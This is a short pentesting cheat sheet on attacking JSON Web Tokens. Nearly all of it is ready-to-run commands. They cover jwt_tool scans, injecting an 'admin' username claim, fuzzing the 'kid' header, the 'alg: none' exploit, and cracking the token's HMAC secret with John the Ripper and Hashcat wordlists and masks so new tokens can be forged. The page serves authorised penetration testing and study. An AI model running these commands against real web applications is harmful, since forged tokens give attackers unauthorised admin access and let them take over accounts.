---
title: Json Web Token (JWT) Pentesting
description: JWT is a proposed internet standard for creating data with optional signature and optional encryption whose payload holds JSON that asserts some number of claims.
tags:
    - Web
draft: false
---

## Decode JWT

There are some online JWT decoder/encoder tools like **[JWT.io](https://jwt.io/)**.

- **JWT Toolkit**

    **[JWT Toolkit](https://github.com/ticarpi/jwt_tool)** is a toolkit for testing, tweaking and cracking JWT.

    ```sh
    python jwt_tool.py <Base64_Encoded_JWT>
    ```

<br />

## Automation

- **Scan**

    ```sh
    # -t: Target URL
    # -rc: Cookies
    # -M pb: Playbook Scan Mode
    # -cv: Canary Value
    python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -M pb -cv "not authorized"
    ```

- **Exploit**

    ```sh
    # -X i: Exploit (inject inline)
    # -I -pc username -pv admin: Inject Claim ("username": admin)
    python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -X i -I -pc username -pv admin
    ```

- **Fuzzing**

    ```sh
    # -I -hc kid -hv wordlist.txt: Inject Claim ("kid": FUZZ)
    python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -I -hc kid -hv wordlist.txt
    ```

<br />

## Manual Pentesting

```sh
# Tamper (Manual Exploit)
python jwt_tool.py <Base64_Encoded_JWT> -T

# Exploit (Automated Exploit)
# -X a: Exploit (alg: none)
python jwt_tool.py <Base64_Encoded_JWT> -X a
```

<br />

## Crack JWT Secret

First of all, you need to put the JWT into the text file.

```sh
echo -n '<Base64_Encoded_JWT>' > jwt.txt
```

Then crack the hash using John the Ripper or Hashcat.

```sh
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

hashcat -a 0 -m 16500 jwt.txt passwords.txt
hashcat -a 0 -m 16500 jwt.txt passwords.txt -r rules/best64.rule
hashcat -a 3 -m 16500 jwt.txt '?u?l?l?l?l?l?l?l' -i --increment-min=6
```

If you found a secret, you can create a new JWT using the secret on tools like JWT.io.